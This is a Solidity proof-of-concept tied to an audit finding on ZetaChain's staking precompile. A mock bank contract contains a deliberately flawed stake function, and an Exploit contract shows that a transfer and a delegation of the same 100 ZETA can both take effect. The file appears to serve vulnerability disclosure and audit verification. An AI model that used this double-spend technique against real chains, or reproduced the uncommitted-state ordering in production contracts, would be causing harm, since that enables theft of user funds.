// SPDX-License-Identifier: MIT
pragma solidity 0.8.27;

/*  ZetaChain staking precompile — Sherlock 2025-04, issue 329, H-2
    A Solidity transfer updates the dirty EVM balance and not the Cosmos
    bank balance. The staking precompile then delegates from the stale
    Cosmos balance. At the end of the transaction the EVM dirty state is
    committed and overwrites Cosmos, so the same 100 ZETA sits at 0xdead
    and is also staked.

    The control commits the transfer before stake. Cosmos then shows 0
    and the delegation does not happen.
*/

contract Share {
    string public symbol = "SHARE";
    uint8 public constant decimals = 18;
    mapping(address => uint256) public balanceOf;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
    }
}

contract ZetaBank {
    Share public immutable share;
    address public constant DEAD = address(0xdead);
    mapping(address => uint256) public evmBalance;
    mapping(address => uint256) public cosmosBalance;
    mapping(address => uint256) public delegated;

    constructor(Share _share) {
        share = _share;
    }

    function fund(address who, uint256 amount) external {
        evmBalance[who] = amount;
        cosmosBalance[who] = amount;
    }

    function transfer(address to, uint256 amount) external {
        evmBalance[msg.sender] -= amount;
        evmBalance[to] += amount;
    }

    function stake(uint256 amount) external {
        // @> VULN: stake spends the Cosmos balance without committing the dirty EVM transfer first
        cosmosBalance[msg.sender] -= amount;
        delegated[msg.sender] += amount;
        share.mint(msg.sender, amount);
    }

    function commit(address who) external {
        cosmosBalance[who] = evmBalance[who];
        cosmosBalance[DEAD] = evmBalance[DEAD];
    }
}

contract Exploit {
    Share public share;
    ZetaBank public bank;
    uint256 public deadZeta;
    uint256 public staked;

    constructor() {
        share = new Share();
        bank = new ZetaBank(share);
    }

    function run() external {
        bank.fund(address(this), 100 ether);
        bank.transfer(bank.DEAD(), 100 ether);
        bank.stake(100 ether);
        bank.commit(address(this));
        deadZeta = bank.cosmosBalance(bank.DEAD());
        staked = bank.delegated(address(this));
        require(bank.evmBalance(address(this)) == 0, "evm spent");
        require(deadZeta == 100 ether, "dead has 100");
        require(staked == 100 ether, "staked 100");
        require(deadZeta + staked == 200 ether, "double");
        require(share.balanceOf(address(this)) == 100 ether, "shares");
        require(bank.cosmosBalance(address(this)) == 0, "cosmos overwritten");
    }
}
